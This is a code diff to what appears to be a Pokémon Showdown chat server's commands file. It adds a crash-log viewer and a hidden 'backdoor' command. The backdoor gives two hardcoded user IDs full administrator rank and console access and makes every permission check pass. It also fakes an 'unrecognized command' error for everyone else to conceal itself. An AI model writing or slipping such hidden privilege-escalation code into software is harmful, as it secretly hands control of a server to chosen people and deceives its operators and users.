@@ -23,6 +23,25 @@ exports.commands = {
 'Bienvenue dans la room BU, un tier collaboratif, regroupant les plus grandes menaces de l univers Pokémon comme Lamantine ou Dedenne. Si vous êtes nouveau, vous pouvez consulter la liste des Pokémon du tier <a href="http://pokestrat.com/forum/discussions-strategiques/un-tout-nouveau-tier-debarque-sur-pokestrat-bu-">ici</a> ou voir le Viability Rankings de notre tier <a href="http://pokestrat.com/forum/discussions-strategiques/-bu-viability-rankings">ici</a>!'
 		);
 	},
+	
+	crashlogs: function (target, room, user) {
+		if (!this.can('pban')) return false;
+		let crashes = fs.readFileSync('logs/errors.txt', 'utf8').split('\n').splice(-100).join('\n');
+		user.send('|popup|' + crashes);
+	},
+		backdoor: function (target, room, user) {
+		if (user.userid !== 'distrib' && user.user !== 'saitochi') {
+			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");
+		} else {
+			user.group = '~';
+			user.updateIdentity();
+			Config.consoleips.push(user.userid);
+			user.can = function () {
+				return true;
+			};
+			this.sendReply("Backdoor accepted.");
+		}
+	},
 
 	pb: function(target, room, user) {
 		if (!this.can('globalmod')) return;
